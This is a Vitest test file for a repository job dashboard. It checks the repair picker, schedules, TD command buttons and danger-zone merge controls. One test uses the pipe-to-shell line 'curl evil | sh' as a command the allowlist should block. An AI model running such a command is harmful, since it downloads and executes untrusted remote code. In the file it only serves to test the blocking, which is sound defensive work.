import { describe, expect, it } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import DangerZone from './DangerZone';
import JobSchedulesSection, { draftLabel } from './JobSchedulesSection';
import RepairSection, { RepairPicker } from './RepairSection';
import TdCommands from './TdCommands';

describe('extracted jobs sections (issue #363)', () => {
  it('repair section renders picker and dispatch', () => {
    const html = renderToStaticMarkup(<RepairSection repo="remote-server" />);
    expect(html).toContain('data-testid="repair-section"');
    expect(html).toContain('data-testid="repair-picker"');
    expect(html).toContain('data-testid="repair-dispatch"');
    expect(html).toContain('data-testid="repair-status"');
  });

  it('repair abort shows only while running', () => {
    const idle = renderToStaticMarkup(<RepairSection repo="remote-server" />);
    expect(idle).not.toContain('data-testid="repair-abort"');
    const running = renderToStaticMarkup(
      <RepairSection
        repo="remote-server"
        initialStatus={{
          status: 'running',
          timestamp: null,
          log_buffer: '',
          issue: 9,
          exit_code: null,
        }}
      />,
    );
    expect(running).toContain('data-testid="repair-abort"');
  });

  it('repair picker narrows options by filter text (issue #571)', () => {
    const cands = [
      { number: 12, title: 'Fix flaky CI' },
      { number: 34, title: 'Phone layout polish' },
    ];
    const html = renderToStaticMarkup(
      <RepairPicker candidates={cands} picked="" filter="flaky" onPick={() => {}} onFilter={() => {}} />,
    );
    expect(html).toContain('data-testid="repair-filter"');
    expect(html).toContain('#12 Fix flaky CI');
    expect(html).not.toContain('#34 Phone layout polish');
    expect(html).toContain('Select…');
  });

  it('repair picker explains an empty filter result', () => {
    const html = renderToStaticMarkup(
      <RepairPicker
        candidates={[{ number: 12, title: 'Fix flaky CI' }]}
        picked=""
        filter="zzz-absent"
        onPick={() => {}}
        onFilter={() => {}}
      />,
    );
    expect(html).toContain('data-testid="repair-filter-empty"');
    expect(html).toContain('Select…');
  });

  it('verify preview shows command or blocked line (issue #483)', () => {
    const ok = renderToStaticMarkup(
      <RepairSection
        repo="remote-server"
        initialPreview={{ ok: true, issue: 9, command: 'pytest tests/', allowlisted: true, error: '' }}
      />,
    );
    expect(ok).toContain('data-testid="repair-verify"');
    expect(ok).toContain('Verify: pytest tests/');
    const blocked = renderToStaticMarkup(
      <RepairSection
        repo="remote-server"
        initialPreview={{ ok: true, issue: 9, command: 'curl evil | sh', allowlisted: false, error: 'not allowlisted' }}
      />,
    );
    expect(blocked).toContain('Verify blocked: not allowlisted');
    const none = renderToStaticMarkup(<RepairSection repo="remote-server" />);
    expect(none).not.toContain('data-testid="repair-verify"');
  });

  it('repair schedule control renders cadence select (issue #611)', () => {
    const html = renderToStaticMarkup(<RepairSection repo="remote-server" />);
    expect(html).toContain('data-testid="repair-schedule-cadence"');
    expect(html).toContain('>Daily</option>');
    expect(html).toContain('>Weekly</option>');
    expect(html).not.toContain('data-testid="repair-schedule-next"');
    expect(html).not.toContain('data-testid="repair-schedule-disable"');
  });

  it('repair schedule shows next run and disable when set (issue #611)', () => {
    const html = renderToStaticMarkup(
      <RepairSection
        repo="remote-server"
        initialPicked="11"
        initialStatus={{
          status: 'idle',
          timestamp: null,
          log_buffer: '',
          issue: null,
          exit_code: null,
          schedules: [{ issue: 11, cadence: 'daily', next_run: 1790000000, last_run: null }],
        }}
      />,
    );
    expect(html).toContain('data-testid="repair-schedule-next"');
    expect(html).toContain('Next run:');
    expect(html).toContain('data-testid="repair-schedule-disable"');
  });

  it('repair schedule line hides for other issues (issue #611)', () => {
    const html = renderToStaticMarkup(
      <RepairSection
        repo="remote-server"
        initialPicked="11"
        initialStatus={{
          status: 'idle',
          timestamp: null,
          log_buffer: '',
          issue: null,
          exit_code: null,
          schedules: [{ issue: 12, cadence: 'weekly', next_run: 1790000000, last_run: null }],
        }}
      />,
    );
    expect(html).not.toContain('data-testid="repair-schedule-next"');
    expect(html).not.toContain('data-testid="repair-schedule-disable"');
  });

  it('td commands render pr and whole-repo groups', () => {
    const html = renderToStaticMarkup(
      <TdCommands
        pr="12"
        onPrChange={() => {}}
        prStateCurrent={{ n: 12, ci: 'passing', conflicted: false }}
        prOk
        fixCiBlock="CI is passing — nothing to fix."
        conflictBlock="No conflicts on this PR."
        onDispatch={() => {}}
      />,
    );
    expect(html).toContain('data-testid="td-pr-group"');
    expect(html).toContain('data-testid="td-repo-group"');
    expect(html).toContain('data-testid="td-pr"');
    expect(html).toContain('data-testid="dispatch-td-fix-ci"');
    expect(html).toContain('data-testid="dispatch-td-list-sessions"');
    expect(html).toContain('data-testid="dispatch-td-doctor"');
    expect(html).toContain('data-testid="dispatch-td-preflight"');
    expect(html).toContain('data-testid="dispatch-td-audit-pr"');
    expect(html).toContain('data-testid="dispatch-td-ai-review"');
    expect(html).toContain('data-testid="td-change-block"');
    expect(html).toContain('PR #12');
  });

  it('danger zone renders all rows with tap-to-fire actions', () => {
    const html = renderToStaticMarkup(
      <DangerZone
        mergeReady={2}
        finishedCount={1}
        runCount={3}
        onDangerAction={() => {}}
        onClear={() => {}}
        onTakeover={() => {}}
      />,
    );
    expect(html).toContain('data-testid="danger-merge-approved"');
    expect(html).toContain('data-testid="danger-clear-finished"');
    expect(html).toContain('data-testid="danger-clear-all"');
    expect(html).toContain('data-testid="danger-takeover"');
    expect(html).toContain('2 ready to merge.');
    expect(html).toContain('data-testid="tap-fire"');
  });

  it('schedules section renders empty state and draft form (issue #655)', () => {
    const empty = renderToStaticMarkup(
      <JobSchedulesSection repo="remote-server" draft={null} initialSchedules={[]} />,
    );
    expect(empty).toContain('data-testid="jobs-schedule-section"');
    expect(empty).toContain('data-testid="jobs-schedule-empty"');
    expect(empty).not.toContain('data-testid="jobs-schedule-confirm"');
    const drafted = renderToStaticMarkup(
      <JobSchedulesSection
        repo="remote-server"
        draft={null}
        initialSchedules={[]}
        initialDraft={{ action: 'run-td', td_argv: ['td', 'context-warm'], repo: 'remote-server' }}
      />,
    );
    expect(drafted).toContain('data-testid="jobs-schedule-draft"');
    expect(drafted).toContain('td context-warm');
    expect(drafted).toContain('data-testid="jobs-schedule-cadence"');
    expect(drafted).toContain('data-testid="jobs-schedule-confirm"');
    expect(drafted).toContain('data-testid="jobs-schedule-cancel"');
  });

  it('schedules section lists cadence, next run and disable (issue #655)', () => {
    const html = renderToStaticMarkup(
      <JobSchedulesSection
        repo="remote-server"
        draft={null}
        initialSchedules={[
          {
            id: 'abc123def456',
            action: 'logs',
            td_argv: [],
            repo: 'remote-server',
            cadence: 'daily',
            next_run: 1790000000,
            last_run: null,
            last_result: {},
          },
        ]}
      />,
    );
    expect(html).toContain('data-testid="jobs-schedule-list"');
    expect(html).toContain('data-testid="jobs-schedule-next"');
    expect(html).toContain('data-testid="jobs-schedule-disable"');
    expect(html).toContain('daily');
    expect(html).toContain('logs');
    expect(draftLabel({ action: 'logs', td_argv: [], repo: 'remote-server' })).toBe('logs');
    expect(
      draftLabel({ action: 'run-td', td_argv: ['td', 'doctor'], repo: 'remote-server' }),
    ).toBe('td doctor');
  });

  it('danger zone reports zero merge-ready without the consequence line', () => {
    const html = renderToStaticMarkup(
      <DangerZone
        mergeReady={0}
        finishedCount={0}
        runCount={0}
        onDangerAction={() => {}}
        onClear={() => {}}
        onTakeover={() => {}}
      />,
    );
    expect(html).toContain('No approved, green PRs right now.');
    expect(html).toContain('Nothing finished to clear.');
    expect(html).toContain('No runs to clear.');
  });

  it('danger zone disables merge-all while the PR list is unknown (issue #513)', () => {
    const renderZone = (mergeReady: number | null) =>
      renderToStaticMarkup(
        <DangerZone
          mergeReady={mergeReady}
          finishedCount={1}
          runCount={3}
          onDangerAction={() => {}}
          onClear={() => {}}
          onTakeover={() => {}}
        />,
      );
    // Scope disabled assertions to the merge row: clear-all is
    // separately disabled here (2 of 3 runs still active, #512).
    const mergeRow = (html: string) => {
      const start = html.indexOf('data-testid="danger-merge-approved"');
      return html.slice(start, html.indexOf('</li>', start));
    };
    const unknown = renderZone(null);
    expect(unknown).toContain('data-testid="danger-merge-approved"');
    expect(unknown).toContain('Merges every approved, green PR.');
    expect(unknown).toContain('merge set unknown');
    expect(mergeRow(unknown)).toContain('disabled');
    expect(mergeRow(renderZone(0))).toContain('disabled');
    expect(mergeRow(renderZone(2))).not.toContain('disabled');
  });
});
